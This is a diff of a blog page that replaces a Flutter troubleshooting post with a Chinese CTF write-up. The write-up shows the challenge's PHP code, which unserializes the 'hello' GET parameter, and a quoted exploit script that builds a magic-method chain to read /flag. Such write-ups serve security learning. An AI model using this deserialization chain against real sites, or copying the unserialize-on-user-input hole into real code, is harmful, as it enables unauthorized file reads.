@@ -6,23 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Flutter配置各种解决 | Pushinl</title>
+  <title>强网杯一道题的wp | Pushinl</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="踩坑实录">
+  <meta name="description" content="就复现出来了 赌徒 太难了。。。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Flutter配置各种解决">
-<meta property="og:url" content="http://example.com/2021/05/02/Flutter%E9%85%8D%E7%BD%AE%E5%90%84%E7%A7%8D%E8%A7%A3%E5%86%B3/index.html">
+<meta property="og:title" content="强网杯一道题的wp">
+<meta property="og:url" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84wp/index.html">
 <meta property="og:site_name" content="Pushinl">
-<meta property="og:description" content="踩坑实录">
+<meta property="og:description" content="就复现出来了 赌徒 太难了。。。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2021/05/02/JUQkCte1AuNmbEh.png">
-<meta property="article:published_time" content="2021-05-02T05:23:10.000Z">
-<meta property="article:modified_time" content="2021-05-02T07:12:28.018Z">
+<meta property="article:published_time" content="2021-06-13T05:36:30.000Z">
+<meta property="article:modified_time" content="2021-07-04T13:09:39.606Z">
 <meta property="article:author" content="Pushinl&#x2F;Row Srank">
-<meta property="article:tag" content="Android">
-<meta property="article:tag" content="Flutter">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/05/02/JUQkCte1AuNmbEh.png">
   
     <link rel="alternative" href="/atom.xml" title="Pushinl" type="application/atom+xml">
   
@@ -158,41 +155,41 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Flutter配置各种解决" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-强网杯一道题的wp" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Flutter配置各种解决
+      强网杯一道题的wp
     </h1>
   
 
         
         
 
-<a href="/2021/05/02/Flutter%E9%85%8D%E7%BD%AE%E5%90%84%E7%A7%8D%E8%A7%A3%E5%86%B3/" class="archive-article-date">
-  	<time datetime="2021-05-02T05:23:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-02</time>
+<a href="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84wp/" class="archive-article-date">
+  	<time datetime="2021-06-13T05:36:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-13</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>踩坑实录</p>
+        <p>就复现出来了 赌徒 太难了。。。</p>
 <a id="more"></a>
 
-<h2 id="flutter-doctor"><a href="#flutter-doctor" class="headerlink" title="flutter doctor"></a>flutter doctor</h2><p>这边没遇到啥问题，顺风顺水就全是对勾了<br><img src="https://i.loli.net/2021/05/02/JUQkCte1AuNmbEh.png"></p>
-<h2 id="找不到自己的模拟器"><a href="#找不到自己的模拟器" class="headerlink" title="找不到自己的模拟器"></a>找不到自己的模拟器</h2><p>上边一直是no device</p>
-<p>解决：flutter config –android-sdk ”android sdk路径“</p>
-<p>然后还得新建个虚拟机。。原来那个不能用，我也不知道为啥</p>
-<h2 id="一直卡在Running-Gradle-task-‘assembleDebug’后报错"><a href="#一直卡在Running-Gradle-task-‘assembleDebug’后报错" class="headerlink" title="一直卡在Running Gradle task ‘assembleDebug’后报错"></a>一直卡在Running Gradle task ‘assembleDebug’后报错</h2><p>解决：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560865/article/details/107175819">https://blog.csdn.net/qq_41560865/article/details/107175819</a></p>
-<p>其中第三四步有点旧了，现在的flutter.gradle里没有MAVEN_REPO，只有DEFAULT_MAVEN_HOST，把它改成“<a target="_blank" rel="noopener" href="https://storage.flutter-io.cn”/">https://storage.flutter-io.cn”</a><br>第四步别手贱动了上边的storageUrl（就照他这个改就行，</p>
-<h2 id="一直卡在Activating-Dart-DevTools…虚拟机白屏"><a href="#一直卡在Activating-Dart-DevTools…虚拟机白屏" class="headerlink" title="一直卡在Activating Dart DevTools…虚拟机白屏"></a>一直卡在Activating Dart DevTools…虚拟机白屏</h2><p>网上说run-&gt;Edit Configurations 里面additional arguments中添加–enable-software-rendering </p>
-<p>然而Edit Configurations里面已经没有additional arguments了，变成了俩，一个run一个attach，应该是放第一个里边，然后依旧白屏。。。</p>
-<p>然后发现断网可以正常调试，具体原因尚不明确。</p>
-<p>然后VPN改成全局又改回规则，–enable-software-rendering又去掉，连真机重复run了快十遍，成功了（</p>
+<p>题目提示看源代码</p>
+<p>扫到<a target="_blank" rel="noopener" href="http://www.zip就下载下来了/">www.zip就下载下来了</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">`&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $flag=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$cc</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $phonenumber=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> $promise=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $sth_to_set;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">        $hint=base64_encode(file_get_contents($file));</span><br><span class="line">        <span class="keyword">echo</span> $hint;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $hi = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>反序列化</p>
+<p>下面是Nu1l的wp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> $name;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;name=$a;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> $file;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$b</span>)</span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]=$b;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> $filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> $a;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;a=<span class="keyword">new</span> Room();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Room();</span><br><span class="line">$a-&gt;invoke();</span><br><span class="line">$b=<span class="keyword">new</span> Info($a);</span><br><span class="line">$c=<span class="keyword">new</span> Start($b);</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一些知识点：</p>
+<p>用到了魔术方法<code>__construct()</code> <code>__invoke()``__tostring</code></p>
+<p>这题这个调用链比较简单容易构造（虽然我自己也没构造出来</p>
 
       
 
@@ -206,11 +203,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Flutter</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		
 		</ul>
@@ -277,7 +270,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/05/02/Flutter%E9%85%8D%E7%BD%AE%E5%90%84%E7%A7%8D%E8%A7%A3%E5%86%B3/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84wp/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -291,18 +284,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/05/25/Web%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/07/04/buuctf%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Web技能树
+          buuctf题目复现
         
       </div>
     </a>
   
   
-    <a href="/2021/04/18/%E6%8B%BE%E6%8D%8C/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">拾捌</div>
+    <a href="/2021/05/25/Web%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Web技能树</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -329,7 +322,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flutter-doctor"><span class="toc-number">1.</span> <span class="toc-text">flutter doctor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E4%B8%8D%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">找不到自己的模拟器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%9B%B4%E5%8D%A1%E5%9C%A8Running-Gradle-task-%E2%80%98assembleDebug%E2%80%99%E5%90%8E%E6%8A%A5%E9%94%99"><span class="toc-number">3.</span> <span class="toc-text">一直卡在Running Gradle task ‘assembleDebug’后报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%9B%B4%E5%8D%A1%E5%9C%A8Activating-Dart-DevTools%E2%80%A6%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%99%BD%E5%B1%8F"><span class="toc-number">4.</span> <span class="toc-text">一直卡在Activating Dart DevTools…虚拟机白屏</span></a></li></ol>
+                    目录，不存在的…
                     </div>
                 </span>
             </div>
